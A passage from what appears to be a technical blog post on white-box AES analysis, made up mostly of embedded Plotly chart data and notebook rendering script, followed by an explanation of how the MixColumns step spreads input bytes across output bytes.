14.209, 15.209], \"y\": [217, 62, 62, 132, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=210\", \"type\": \"scatter\", \"x\": [0.21, 1.21, 2.21, 3.21, 4.21, 5.21, 6.21, 7.21, 8.21, 9.21, 10.21, 11.21, 12.21, 13.21, 14.21, 15.21], \"y\": [212, 181, 181, 2, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=211\", \"type\": \"scatter\", \"x\": [0.211, 1.211, 2.211, 3.211, 4.211, 5.211, 6.211, 7.211, 8.211, 9.211, 10.211, 11.211, 12.211, 13.211, 14.211, 15.211], \"y\": [105, 102, 102, 108, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=212\", \"type\": \"scatter\", \"x\": [0.212, 1.212, 2.212, 3.212, 4.212, 5.212, 6.212, 7.212, 8.212, 9.212, 10.212, 11.212, 12.212, 13.212, 14.212, 15.212], \"y\": [53, 72, 72, 30, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=213\", \"type\": \"scatter\", \"x\": [0.213, 1.213, 2.213, 3.213, 4.213, 5.213, 6.213, 7.213, 8.213, 9.213, 10.213, 11.213, 12.213, 13.213, 14.213, 15.213], \"y\": [163, 3, 3, 195, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=214\", \"type\": \"scatter\", \"x\": [0.214, 1.214, 2.214, 3.214, 4.214, 5.214, 6.214, 7.214, 8.214, 9.214, 10.214, 11.214, 12.214, 13.214, 14.214, 15.214], \"y\": [82, 246, 246, 199, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=215\", \"type\": \"scatter\", \"x\": [0.215, 1.215, 2.215, 3.215, 4.215, 5.215, 6.215, 7.215, 8.215, 9.215, 10.215, 11.215, 12.215, 13.215, 14.215, 15.215], \"y\": [185, 14, 14, 212, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=216\", \"type\": \"scatter\", \"x\": [0.216, 1.216, 2.216, 3.216, 4.216, 5.216, 6.216, 7.216, 8.216, 9.216, 10.216, 11.216, 12.216, 13.216, 14.216, 15.216], \"y\": [103, 97, 97, 101, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=217\", \"type\": \"scatter\", \"x\": [0.217, 1.217, 2.217, 3.217, 4.217, 5.217, 6.217, 7.217, 8.217, 9.217, 10.217, 11.217, 12.217, 13.217, 14.217, 15.217], \"y\": [207, 53, 53, 153, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=218\", \"type\": \"scatter\", \"x\": [0.218, 1.218, 2.218, 3.218, 4.218, 5.218, 6.218, 7.218, 8.218, 9.218, 10.218, 11.218, 12.218, 13.218, 14.218, 15.218], \"y\": [11, 87, 87, 63, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=219\", \"type\": \"scatter\", \"x\": [0.219, 1.219, 2.219, 3.219, 4.219, 5.219, 6.219, 7.219, 8.219, 9.219, 10.219, 11.219, 12.219, 13.219, 14.219, 15.219], \"y\": [204, 185, 185, 22, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=220\", \"type\": \"scatter\", \"x\": [0.22, 1.22, 2.22, 3.22, 4.22, 5.22, 6.22, 7.22, 8.22, 9.22, 10.22, 11.22, 12.22, 13.22, 14.22, 15.22], \"y\": [178, 134, 134, 87, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=221\", \"type\": \"scatter\", \"x\": [0.221, 1.221, 2.221, 3.221, 4.221, 5.221, 6.221, 7.221, 8.221, 9.221, 10.221, 11.221, 12.221, 13.221, 14.221, 15.221], \"y\": [60, 193, 193, 158, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=222\", \"type\": \"scatter\", \"x\": [0.222, 1.222, 2.222, 3.222, 4.222, 5.222, 6.222, 7.222, 8.222, 9.222, 10.222, 11.222, 12.222, 13.222, 14.222, 15.222], \"y\": [159, 29, 29, 225, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=223\", \"type\": \"scatter\", \"x\": [0.223, 1.223, 2.223, 3.223, 4.223, 5.223, 6.223, 7.223, 8.223, 9.223, 10.223, 11.223, 12.223, 13.223, 14.223, 15.223], \"y\": [130, 158, 158, 127, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=224\", \"type\": \"scatter\", \"x\": [0.224, 1.224, 2.224, 3.224, 4.224, 5.224, 6.224, 7.224, 8.224, 9.224, 10.224, 11.224, 12.224, 13.224, 14.224, 15.224], \"y\": [124, 225, 225, 254, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=225\", \"type\": \"scatter\", \"x\": [0.225, 1.225, 2.225, 3.225, 4.225, 5.225, 6.225, 7.225, 8.225, 9.225, 10.225, 11.225, 12.225, 13.225, 14.225, 15.225], \"y\": [78, 248, 248, 213, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=226\", \"type\": \"scatter\", \"x\": [0.226, 1.226, 2.226, 3.226, 4.226, 5.226, 6.226, 7.226, 8.226, 9.226, 10.226, 11.226, 12.226, 13.226, 14.226, 15.226], \"y\": [142, 152, 152, 117, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=227\", \"type\": \"scatter\", \"x\": [0.227, 1.227, 2.227, 3.227, 4.227, 5.227, 6.227, 7.227, 8.227, 9.227, 10.227, 11.227, 12.227, 13.227, 14.227, 15.227], \"y\": [135, 17, 17, 245, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=228\", \"type\": \"scatter\", \"x\": [0.228, 1.228, 2.228, 3.228, 4.228, 5.228, 6.228, 7.228, 8.228, 9.228, 10.228, 11.228, 12.228, 13.228, 14.228, 15.228], \"y\": [119, 105, 105, 125, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=229\", \"type\": \"scatter\", \"x\": [0.229, 1.229, 2.229, 3.229, 4.229, 5.229, 6.229, 7.229, 8.229, 9.229, 10.229, 11.229, 12.229, 13.229, 14.229, 15.229], \"y\": [12, 217, 217, 182, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=230\", \"type\": \"scatter\", \"x\": [0.23, 1.23, 2.23, 3.23, 4.23, 5.23, 6.23, 7.23, 8.23, 9.23, 10.23, 11.23, 12.23, 13.23, 14.23, 15.23], \"y\": [162, 142, 142, 79, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=231\", \"type\": \"scatter\", \"x\": [0.231, 1.231, 2.231, 3.231, 4.231, 5.231, 6.231, 7.231, 8.231, 9.231, 10.231, 11.231, 12.231, 13.231, 14.231, 15.231], \"y\": [150, 148, 148, 97, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=232\", \"type\": \"scatter\", \"x\": [0.232, 1.232, 2.232, 3.232, 4.232, 5.232, 6.232, 7.232, 8.232, 9.232, 10.232, 11.232, 12.232, 13.232, 14.232, 15.232], \"y\": [136, 155, 155, 112, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=233\", \"type\": \"scatter\", \"x\": [0.233, 1.233, 2.233, 3.233, 4.233, 5.233, 6.233, 7.233, 8.233, 9.233, 10.233, 11.233, 12.233, 13.233, 14.233, 15.233], \"y\": [153, 30, 30, 228, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=234\", \"type\": \"scatter\", \"x\": [0.234, 1.234, 2.234, 3.234, 4.234, 5.234, 6.234, 7.234, 8.234, 9.234, 10.234, 11.234, 12.234, 13.234, 14.234, 15.234], \"y\": [176, 135, 135, 84, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=235\", \"type\": \"scatter\", \"x\": [0.23500000000000001, 1.235, 2.235, 3.235, 4.235, 5.235, 6.235, 7.235, 8.235, 9.235, 10.235, 11.235, 12.235, 13.235, 14.235, 15.235], \"y\": [108, 233, 233, 230, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=236\", \"type\": \"scatter\", \"x\": [0.23600000000000002, 1.236, 2.236, 3.236, 4.236, 5.236, 6.236, 7.236, 8.236, 9.236, 10.236, 11.236, 12.236, 13.236, 14.236, 15.236], \"y\": [34, 206, 206, 143, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=237\", \"type\": \"scatter\", \"x\": [0.23700000000000002, 1.237, 2.237, 3.237, 4.237, 5.237, 6.237, 7.237, 8.237, 9.237, 10.237, 11.237, 12.237, 13.237, 14.237, 15.237], \"y\": [15, 85, 85, 57, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=238\", \"type\": \"scatter\", \"x\": [0.23800000000000002, 1.238, 2.238, 3.238, 4.238, 5.238, 6.238, 7.238, 8.238, 9.238, 10.238, 11.238, 12.238, 13.238, 14.238, 15.238], \"y\": [245, 40, 40, 190, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=239\", \"type\": \"scatter\", \"x\": [0.23900000000000002, 1.239, 2.239, 3.239, 4.239, 5.239, 6.239, 7.239, 8.239, 9.239, 10.239, 11.239, 12.239, 13.239, 14.239, 15.239], \"y\": [0, 223, 223, 188, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=240\", \"type\": \"scatter\", \"x\": [0.24, 1.24, 2.24, 3.24, 4.24, 5.24, 6.24, 7.24, 8.24, 9.24, 10.24, 11.24, 12.24, 13.24, 14.24, 15.24], \"y\": [166, 140, 140, 73, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=241\", \"type\": \"scatter\", \"x\": [0.241, 1.241, 2.241, 3.241, 4.241, 5.241, 6.241, 7.241, 8.241, 9.241, 10.241, 11.241, 12.241, 13.241, 14.241, 15.241], \"y\": [252, 161, 161, 62, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=242\", \"type\": \"scatter\", \"x\": [0.242, 1.242, 2.242, 3.242, 4.242, 5.242, 6.242, 7.242, 8.242, 9.242, 10.242, 11.242, 12.242, 13.242, 14.242, 15.242], \"y\": [172, 137, 137, 70, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=243\", \"type\": \"scatter\", \"x\": [0.243, 1.2429999999999999, 2.243, 3.243, 4.243, 5.243, 6.243, 7.243, 8.243, 9.243, 10.243, 11.243, 12.243, 13.243, 14.243, 15.243], \"y\": [191, 13, 13, 209, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=244\", \"type\": \"scatter\", \"x\": [0.244, 1.244, 2.2439999999999998, 3.2439999999999998, 4.244, 5.244, 6.244, 7.244, 8.244, 9.244, 10.244, 11.244, 12.244, 13.244, 14.244, 15.244], \"y\": [192, 191, 191, 28, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=245\", \"type\": \"scatter\", \"x\": [0.245, 1.245, 2.245, 3.245, 4.245, 5.245, 6.245, 7.245, 8.245, 9.245, 10.245, 11.245, 12.245, 13.245, 14.245, 15.245], \"y\": [114, 230, 230, 247, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=246\", \"type\": \"scatter\", \"x\": [0.246, 1.246, 2.246, 3.246, 4.246, 5.246, 6.246, 7.246, 8.246, 9.246, 10.246, 11.246, 12.246, 13.246, 14.246, 15.246], \"y\": [33, 66, 66, 0, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=247\", \"type\": \"scatter\", \"x\": [0.247, 1.2469999999999999, 2.247, 3.247, 4.247, 5.247, 6.247, 7.247, 8.247, 9.247, 10.247, 11.247, 12.247, 13.247, 14.247, 15.247], \"y\": [117, 104, 104, 126, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=248\", \"type\": \"scatter\", \"x\": [0.248, 1.248, 2.248, 3.248, 4.248, 5.248, 6.248, 7.248, 8.248, 9.248, 10.248, 11.248, 12.248, 13.248, 14.248, 15.248], \"y\": [39, 65, 65, 5, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=249\", \"type\": \"scatter\", \"x\": [0.249, 1.249, 2.249, 3.249, 4.249, 5.249, 6.249, 7.249, 8.249, 9.249, 10.249, 11.249, 12.249, 13.249, 14.249, 15.249], \"y\": [140, 153, 153, 118, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=250\", \"type\": \"scatter\", \"x\": [0.25, 1.25, 2.25, 3.25, 4.25, 5.25, 6.25, 7.25, 8.25, 9.25, 10.25, 11.25, 12.25, 13.25, 14.25, 15.25], \"y\": [255, 45, 45, 177, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=251\", \"type\": \"scatter\", \"x\": [0.251, 1.251, 2.251, 3.251, 4.251, 5.251, 6.251, 7.251, 8.251, 9.251, 10.251, 11.251, 12.251, 13.251, 14.251, 15.251], \"y\": [187, 15, 15, 215, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=252\", \"type\": \"scatter\", \"x\": [0.252, 1.252, 2.252, 3.252, 4.252, 5.252, 6.252, 7.252, 8.252, 9.252, 10.252, 11.252, 12.252, 13.252, 14.252, 15.252], \"y\": [222, 176, 176, 13, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=253\", \"type\": \"scatter\", \"x\": [0.253, 1.2530000000000001, 2.253, 3.253, 4.253, 5.253, 6.253, 7.253, 8.253, 9.253, 10.253, 11.253, 12.253, 13.253, 14.253, 15.253], \"y\": [13, 84, 84, 58, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=254\", \"type\": \"scatter\", \"x\": [0.254, 1.254, 2.254, 3.254, 4.254, 5.254, 6.254, 7.254, 8.254, 9.254, 10.254, 11.254, 12.254, 13.254, 14.254, 15.254], \"y\": [200, 187, 187, 16, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}, {\"mode\": \"markers\", \"name\": \"Plaintext_b0=255\", \"type\": \"scatter\", \"x\": [0.255, 1.255, 2.255, 3.255, 4.255, 5.255, 6.255, 7.255, 8.255, 9.255, 10.255, 11.255, 12.255, 13.255, 14.255, 15.255], \"y\": [137, 22, 22, 252, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]}], {\"template\": {\"data\": {\"bar\": [{\"error_x\": {\"color\": \"#2a3f5f\"}, \"error_y\": {\"color\": \"#2a3f5f\"}, \"marker\": {\"line\": {\"color\": \"#E5ECF6\", \"width\": 0.5}}, \"type\": \"bar\"}], \"barpolar\": [{\"marker\": {\"line\": {\"color\": \"#E5ECF6\", \"width\": 0.5}}, \"type\": \"barpolar\"}], \"carpet\": [{\"aaxis\": {\"endlinecolor\": \"#2a3f5f\", \"gridcolor\": \"white\", \"linecolor\": \"white\", \"minorgridcolor\": \"white\", \"startlinecolor\": \"#2a3f5f\"}, \"baxis\": {\"endlinecolor\": \"#2a3f5f\", \"gridcolor\": \"white\", \"linecolor\": \"white\", \"minorgridcolor\": \"white\", \"startlinecolor\": \"#2a3f5f\"}, \"type\": \"carpet\"}], \"choropleth\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"type\": \"choropleth\"}], \"contour\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"contour\"}], \"contourcarpet\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"type\": \"contourcarpet\"}], \"heatmap\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"heatmap\"}], \"heatmapgl\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"heatmapgl\"}], \"histogram\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"histogram\"}], \"histogram2d\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"histogram2d\"}], \"histogram2dcontour\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"histogram2dcontour\"}], \"mesh3d\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"type\": \"mesh3d\"}], \"parcoords\": [{\"line\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"parcoords\"}], \"pie\": [{\"automargin\": true, \"type\": \"pie\"}], \"scatter\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatter\"}], \"scatter3d\": [{\"line\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatter3d\"}], \"scattercarpet\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattercarpet\"}], \"scattergeo\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattergeo\"}], \"scattergl\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattergl\"}], \"scattermapbox\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattermapbox\"}], \"scatterpolar\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterpolar\"}], \"scatterpolargl\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterpolargl\"}], \"scatterternary\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterternary\"}], \"surface\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"surface\"}], \"table\": [{\"cells\": {\"fill\": {\"color\": \"#EBF0F8\"}, \"line\": {\"color\": \"white\"}}, \"header\": {\"fill\": {\"color\": \"#C8D4E3\"}, \"line\": {\"color\": \"white\"}}, \"type\": \"table\"}]}, \"layout\": {\"annotationdefaults\": {\"arrowcolor\": \"#2a3f5f\", \"arrowhead\": 0, \"arrowwidth\": 1}, \"coloraxis\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"colorscale\": {\"diverging\": [[0, \"#8e0152\"], [0.1, \"#c51b7d\"], [0.2, \"#de77ae\"], [0.3, \"#f1b6da\"], [0.4, \"#fde0ef\"], [0.5, \"#f7f7f7\"], [0.6, \"#e6f5d0\"], [0.7, \"#b8e186\"], [0.8, \"#7fbc41\"], [0.9, \"#4d9221\"], [1, \"#276419\"]], \"sequential\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"sequentialminus\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]]}, \"colorway\": [\"#636efa\", \"#EF553B\", \"#00cc96\", \"#ab63fa\", \"#FFA15A\", \"#19d3f3\", \"#FF6692\", \"#B6E880\", \"#FF97FF\", \"#FECB52\"], \"font\": {\"color\": \"#2a3f5f\"}, \"geo\": {\"bgcolor\": \"white\", \"lakecolor\": \"white\", \"landcolor\": \"#E5ECF6\", \"showlakes\": true, \"showland\": true, \"subunitcolor\": \"white\"}, \"hoverlabel\": {\"align\": \"left\"}, \"hovermode\": \"closest\", \"mapbox\": {\"style\": \"light\"}, \"paper_bgcolor\": \"white\", \"plot_bgcolor\": \"#E5ECF6\", \"polar\": {\"angularaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"bgcolor\": \"#E5ECF6\", \"radialaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}}, \"scene\": {\"xaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}, \"yaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}, \"zaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}}, \"shapedefaults\": {\"line\": {\"color\": \"#2a3f5f\"}}, \"ternary\": {\"aaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"baxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"bgcolor\": \"#E5ECF6\", \"caxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}}, \"title\": {\"x\": 0.05}, \"xaxis\": {\"automargin\": true, \"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\", \"title\": {\"standoff\": 15}, \"zerolinecolor\": \"white\", \"zerolinewidth\": 2}, \"yaxis\": {\"automargin\": true, \"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\", \"title\": {\"standoff\": 15}, \"zerolinecolor\": \"white\", \"zerolinewidth\": 2}}}, \"title\": {\"text\": \"Values of each byte of the state with different plaintext\"}, \"xaxis\": {\"title\": {\"text\": \"state byte index\"}}, \"yaxis\": {\"title\": {\"text\": \"byte value\"}}}, {\"responsive\": true} ).then(function(){ var gd = document.getElementById('4d42a43a-d31f-41c8-a94b-63e7e58b551b'); var x = new MutationObserver(function (mutations, observer) {{ var display = window.getComputedStyle(gd).display; if (!display || display === 'none') {{ console.log([gd, 'removed!']); Plotly.purge(gd); observer.disconnect(); }} }}); // Listen for the removal of the full notebook cells var notebookContainer = gd.closest('#notebook-container'); if (notebookContainer) {{ x.observe(notebookContainer, {childList: true}); }} // Listen for the clearing of the current output cell var outputEl = gd.closest('.output'); if (outputEl) {{ x.observe(outputEl, {childList: true}); }} }) }; ; </script> \n  </div> \n  <p>This comes from the <strong>MixColumn</strong> operation, that merges together 4 bytes to generate the output byte.</p> \n  <p>If we have a look at the example at the very beginning of the article, we see that before the <strong>MixColumn</strong> operation, one byte of input is in relation with only one byte of the key (that happens during <strong>AddRoundKey</strong>).</p> \n  <pre class=\"literal-block\">\n=== Plain AES ===\n\nOriginal state   [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255]\nAddRoundKey  [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 254]\nSubstituteBytes  [124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 187]\nShiftRows    [124, 124, 124, 187, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124]\nMixColumns   [187, 187, 46, 233, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124]\nFinalState   [187, 187, 46, 233, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124, 124]\n</pre> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES.png\" style=\"width: 563.76px; height: 233.28px;\" /> \n  <p>The MixColumns operation is <strong>mixing</strong> bytes together. The input bytes that are mixed together, and the affected output bytes are summarized below:</p> \n  <ul class=\"simple\"> \n   <li>Modifying input bytes <tt class=\"docutils literal\">[0,5,10,15]</tt> will affect output bytes <tt class=\"docutils literal\">[0,1,2,3]</tt> (see example below)</li> \n   <li>Modifying input bytes <tt class=\"docutils literal\">[1,6,11,12]</tt> will affect output bytes <tt class=\"docutils literal\">[4,5,6,7]</tt></li> \n   <li>Modifying input bytes <tt class=\"docutils literal\">[2,7,8,13]</tt> will affect output bytes <tt class=\"docutils literal\">[8,9,10,11]</tt></li> \n   <li>Modifying input bytes <tt class=\"docutils literal\">[3,4,9,14]</tt> will affect output bytes <tt class=\"docutils 